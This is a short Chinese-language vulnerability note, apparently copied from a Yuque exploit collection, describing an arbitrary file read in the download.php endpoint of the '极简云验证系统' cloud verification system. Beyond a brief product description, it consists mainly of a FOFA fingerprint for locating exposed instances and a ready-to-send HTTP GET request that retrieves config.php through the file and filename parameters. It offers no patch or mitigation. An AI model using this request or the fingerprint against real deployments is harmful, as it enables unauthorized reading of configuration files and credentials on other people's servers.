# 极简云验证系统download存在任意文件读取漏洞

# 一、漏洞简介
  极简云验证系统是一种简洁高效的身份验证方案，通过使用云端技术，实现用户身份验证和访问控制。用户只需输入手机号或邮箱等基本信息，系统即可发送验证码，验证过程快速便捷。此系统具有高度可扩展性和安全性，可适用于各种应用场景，如登录、支付等。同时，它还支持多种验证方式，如短信验证码、邮箱验证码等，为用户提供了灵活多样的选择。极简云验证系统download存在任意文件读取漏洞.

# 二、影响版本
+ 极简云验证系统

# 三、资产测绘
+ fofa`body="/js/lib/slimscroll.js"`
+ 特征

![1716702913106-fec91c96-5f2a-4063-a0e5-b65356000943.png](./img/LoAiN1zPg1DKrr7w/1716702913106-fec91c96-5f2a-4063-a0e5-b65356000943-988402.png)

# 四、漏洞复现
```plain
GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```

![1716702895265-c8e22574-c199-4d32-9242-a80b5e812e26.png](./img/LoAiN1zPg1DKrr7w/1716702895265-c8e22574-c199-4d32-9242-a80b5e812e26-138711.png)



> 更新: 2024-06-01 11:14:22  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/opf4xa6pir84dgb4>